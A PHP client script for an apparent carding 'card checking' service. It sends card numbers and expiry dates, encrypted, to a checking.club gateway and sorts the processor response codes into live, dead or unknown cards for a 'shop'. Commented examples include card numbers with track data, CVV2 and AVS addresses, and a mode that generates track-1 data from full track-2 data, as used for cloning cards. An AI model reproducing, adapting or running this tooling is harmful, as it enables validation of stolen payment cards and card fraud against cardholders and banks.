<?php
set_time_limit(0);
function checkdump($ccnum,$ccm,$ccy){
// Need to install php modules:
//		-- php-mcrypt
//		-- php-xml
//		-- php5-dom (for FreeBSD only)



//------------------------REQUIRED CHANGE-SENSITIVE VALUES----------------------
define("__API_VERSION", "1.1.2");
define("__USER_subdomain", "52axxxxxxxxxxxxxxxxxx659");
define("__USER_port", "2004");
// v1.1.0 update >>
define("__API_AUTH_KEY", "fflKWFaNxxxxxxxxxxxxxxxxxx4wYHXl8PMFc3wG9VJo=");
define("__API_REQUEST_KEY", "dIdVWgS7xxxxxxxxxxxxxxxxxxwYhvyocXMWZCVMDq1Y=");
// << v1.1.0 update
//------------------------------------------------------------------------------


// v1.1.0 update >>
$cards = array();

/* ------------------------------------------
   -- Examples: mode = 1 (cards checking) -- 
   ------------------------------------------ */
/* batch with additional info */
/*
$cards['card1'] = array('data'=>'4465420162977490=1106',
												'additional_info'=>base64_encode('CardId=100&UserId=222'));
$cards['card2'] = array('data'=>'4388576031393427=1105',
												'additional_info'=>base64_encode('CardId=101&UserId=333'));
$cards['card3'] = array('data'=>'5232274300021490=1201',
												'additional_info'=>base64_encode('CardId=102&UserId=444&cost=15')); 
*/

/* batch with AVS info*/
/*
$cards['card1'] = array('data'=>'4465420162977490 06/11',
												'cc_info'=>array('cvv2'=>'100'));
$cards['card2'] = array('data'=>'4465420162977490 06/11',
												'cc_info'=>array('avs_address'=>'425 Wilson Ave',
																					'avs_zip'=>'11221'));
$cards['card3'] = array('data'=>'4465420162977490 06/11',
												'cc_info'=>array('cvv2'=>'100',
																					'avs_address'=>'425 Wilson Ave',
																					'avs_zip'=>'11221'));
*/
$itrack = $ccnum.'='.$ccy.$ccm;
/* single card */
$cards['card1'] = array('data'=>$itrack);




/* -------------------------------------------
   -- Examples: mode = 2 (generate track1) -- 
   ------------------------------------------- */
/* random name */
//$cards['card1'] = array('data'=>'5466160145442818=1405101116040460000');	//cc info (full track2)

/* specified name */
/*
$cards['card1'] = array('data'=>'5466160145442818=1405101116040460000',
												'name'=>array('first'=>'John',
																			'last'=>'Smith'));
*/




$request = array('api_version' => __API_VERSION,
									'mode' => 1,										// gateway mode: [1] - check cards; [2] - generate track1; [3] - return account info;
									'cards' => $cards,
									'format_list' => 1,
									'amount' => 1,
									'amount_fixed' => 0,					 	//any value >0 will be considered as USD amount and cost 10 credits each check
									'tr1' => 0,
									'tr2' => 0,
									'lost' => 0,
									'void' => 1,
// >> v1.1.1 update
									'merchant_location_id' => 0
// << v1.1.1 update
								);
																																																																	// >> v1.1.2 update
$gateway_response = SendRequest("request=".urlencode(encrypt_query(GenerateXML($request, true), base64_decode(__API_REQUEST_KEY)))."&encrypt_mode=2");																																																																	// << v1.1.2 update
// << v1.1.0 update

if ($gateway_response == 'gateway offline') {
	exit('gateway offline');
}
elseif ( strpos($gateway_response,'Maintenance')!==false) {
	exit('Gateway is currently undergoing maintenance. Please check again soon.');
}
// v1.1.0 update >>
elseif ( strpos($gateway_response,'Port error')!==false) {
	exit('Wrong pair __USER_subdomain and __USER_port');
}
elseif ( strpos($gateway_response,'Proxy detected')!==false) {
	exit('Your IP is banned. Add IP to a white list.');
}
// << v1.1.0 update
elseif ( strpos($gateway_response,'authentification failed')!==false) {
	exit($gateway_response);
}
else {
	$decrypted_response = decrypt_query($gateway_response, base64_decode(__API_REQUEST_KEY));
	
	if (strpos($decrypted_response,'xml version') === false)		exit('Unable to decrypt response');
	$response_array = xml_to_array($decrypted_response);
	
	if (!is_array($response_array) || !isset($response_array['error']))			exit('Response has wrong format');
	
	switch ($response_array['error']) {
		case 'Unable to login': { exit('Unable to login'); break; }
		case 'Change port': { exit('Change port'); break; }
		case 'Change pwd': { exit('Change pwd'); break; }
		case 'No balance': { exit('No balance'); break; }
		case 'Account blocked': { exit('Account blocked'); break; }
		case 'Invalid cards format': { exit('cards contain illegal simbols'); break; }
		case 'No cards': { exit('No cards in request'); break; }
		case 'Invalid additional info format': { exit('use base64_encode function to encode additional card info'); break; }
// v1.1.0 update >>
		case 'IP rejected': { exit('IP not in white list'); break; }
// << v1.1.0 update
	}
	
	if (@$response_array['api_updated']) {
		// A notice to get a new updated api.client_default.php script and Developer_Guide thru service interface
	}

	//return $response_array; (OLD VERSION)
	//SHOP RESULT//
	if (empty($response_array[error])){
	if ($response_array[response][card1][auth_code] == '00' || $response_array[response][card1][auth_code] == '85' || $response_array[response][card1][auth_code] == '05'){
	return '1';
	} else if ($response_array[response][card1][auth_code] == '04' || $response_array[response][card1][auth_code] == '07' || $response_array[response][card1][auth_code] == '41' || $response_array[response][card1][auth_code] == '43' || $response_array[response][card1][auth_code] == 'EA' || $response_array[response][card1][auth_code] == '79' || $response_array[response][card1][auth_code] == '13' || $response_array[response][card1][auth_code] == '14' || $response_array[response][card1][auth_code] == '80' || $response_array[response][card1][auth_code] == '54' || $response_array[response][card1][auth_code] == '12' || $response_array[response][card1][auth_code] == '78' || $response_array[response][card1][auth_code] == '15' || $response_array[response][card1][auth_code] == '96' || $response_array[response][card1][auth_code] == 'N7'){
	return '2';
	} else if ($response_array[response][card1][auth_code] == 'EB' || $response_array[response][card1][auth_code] == 'EC' || $response_array[response][card1][auth_code] == '51' || $response_array[response][card1][auth_code] == 'N4' || $response_array[response][card1][auth_code] == '61' || $response_array[response][card1][auth_code] == '62' || $response_array[response][card1][auth_code] == '65' || $response_array[response][card1][auth_code] == '93' || $response_array[response][card1][auth_code] == '01' || $response_array[response][card1][auth_code] == '02' || $response_array[response][card1][auth_code] == '28' || $response_array[response][card1][auth_code] == '91' || $response_array[response][card1][auth_code] == '19' || $response_array[response][card1][auth_code] == '57' || $response_array[response][card1][auth_code] == '58' || $response_array[response][card1][auth_code] == '82' || $response_array[response][card1][auth_code] == 'N3'){
	return '4';
	} else {
	return '-1';
	}
	} else {
	return '-1';
	}
	//SHOP RESULT// 
	exit;
}
}
//FUNC

	
	
	
//------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------
//			Functions
//------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------
	function SendRequest( $request )
	{
		$Link = 'https://'.__USER_subdomain.'.checking.club:'.__USER_port.'/api.gateway.authbasic.php';

		SetupCurl(($Curl=curl_init()), $Link, $request);
		$HttpResult = curl_exec($Curl);
		curl_close($Curl);
		if (empty($HttpResult))		return "gateway offline";
		else											return $HttpResult;
	}
//------------------------------------------------------------------------------------------------------------
	function SetupCurl( $Curl, $Link, $Data ) {
		curl_setopt($Curl, CURLOPT_FORBID_REUSE, true);
		curl_setopt($Curl, CURLOPT_FRESH_CONNECT, true);
		curl_setopt($Curl, CURLOPT_CONNECTTIMEOUT, 7);
		curl_setopt($Curl, CURLOPT_TIMEOUT, 600);
		curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($Curl, CURLOPT_BINARYTRANSFER, true);
		curl_setopt($Curl, CURLOPT_HEADER, false);
		curl_setopt($Curl, CURLOPT_MUTE, true);
		curl_setopt($Curl, CURLOPT_VERBOSE, false);
		curl_setopt($Curl, CURLOPT_NOPROGRESS, true);
		curl_setopt($Curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($Curl, CURLOPT_SSL_VERIFYHOST, false);
// v1.1.0 update >>
		curl_setopt($Curl, CURLOPT_FAILONERROR, false);
// << v1.1.0 update
		curl_setopt($Curl, CURLOPT_URL, $Link);
		curl_setopt($Curl, CURLOPT_POST, true);
		curl_setopt($Curl, CURLOPT_POSTFIELDS, $Data );
		curl_setopt($Curl, CURLOPT_HTTPHEADER, array("Content-Type: application/x-www-form-urlencoded"));
// v1.1.0 update >>
		curl_setopt($Curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
		curl_setopt($Curl, CURLOPT_USERPWD, "api_auth_key:".sha1(base64_decode(__API_AUTH_KEY)));
// << v1.1.0 update
	}
//------------------------------------------------------------------------------------------------------------

// v1.1.2 update >>
//------------------------------------------------------------------------------
function pkcs5_pad ($text, $blocksize) {
	if (($pad = $blocksize - (strlen($text) % $blocksize)) < $blocksize)
		return $text . str_repeat(chr($pad), $pad);
	else
		return $text;
}
//------------------------------------------------------------------------------------------------------------
function pkcs5_unpad($text){
	$pad = ord($text{strlen($text)-1});
	if ($pad > strlen($text)) return $text;
	if (strspn($text, chr($pad), strlen($text) - $pad) != $pad) return $text;
	return substr($text, 0, -1 * $pad); 
 }
//------------------------------------------------------------------------------------------------------------
function encrypt_query($input_query, $request_key){
    $crypttext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $request_key, pkcs5_pad($input_query, 16), MCRYPT_MODE_ECB);
		$output_query = trim(base64_encode($crypttext));
 return $output_query;
}
//------------------------------------------------------------------------------------------------------------
function decrypt_query($input_query, $request_key){
    $query = base64_decode($input_query);
    $decrypttext = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $request_key, $query, MCRYPT_MODE_ECB);
		return trim(pkcs5_unpad($decrypttext));
}
//------------------------------------------------------------------------------------------------------------
// << v1.1.2 update

//------------------------------------------------------------------------------
function xml_to_array($XML) {
    $XML = trim($XML);
    $returnVal = $XML; 
    $emptyTag = '<(.*)/>';
    $fullTag = '<\\1></\\1>';
    $XML = preg_replace ("|$emptyTag|", $fullTag, $XML);
    $matches = array();
    if (preg_match_all('|<(.*)>(.*)</\\1>|Ums', trim($XML), $matches)) {
        if (count($matches[1]) > 0) $returnVal = array(); 
        foreach ($matches[1] as $index => $outerXML) {
            $attribute = $outerXML;
            $value = xml_to_array($matches[2][$index]);
            if (! isset($returnVal[$attribute])) $returnVal[$attribute] = array();
                $returnVal[$attribute][] = $value;
        }
    }
        
    if (is_array($returnVal)) foreach ($returnVal as $key => $value) {
        if (is_array($value) && count($value) == 1 && key($value) === 0) {
            $returnVal[$key] = $returnVal[$key][0];
        }
    }
    return $returnVal;
}
//------------------------------------------------------------------------------
function GenerateXML($input_values, $output, $dom = false, $sub_dom = false) {
	if (empty($dom))		$dom=new DOMDocument('1.0', 'utf-8');
	
	foreach ($input_values as $name=>$value) {
		if (is_array($value)) {
			$sub_array = $dom->createElement($name);
			if (empty($sub_dom))	$dom->appendChild($sub_array);
			else									$sub_dom->appendChild($sub_array);
			GenerateXML($value, false, $dom, $sub_array);
		}
		else {			
			if (empty($sub_dom))	$dom->appendChild( $dom->createElement($name, htmlspecialchars($value)));
			else									$sub_dom->appendChild( $dom->createElement($name, htmlspecialchars($value)));
		}			
	}
	
	if ($output)				{ $dom->formatOutput = true; 
												return $dom->saveXML();
											}
}
//------------------------------------------------------------------------------
	    //-1 = Invalid
	    //1 = LIVE
	    //2 = DEAD
	    //3 = API ERROR
	    //4 = UNKNOWN
?>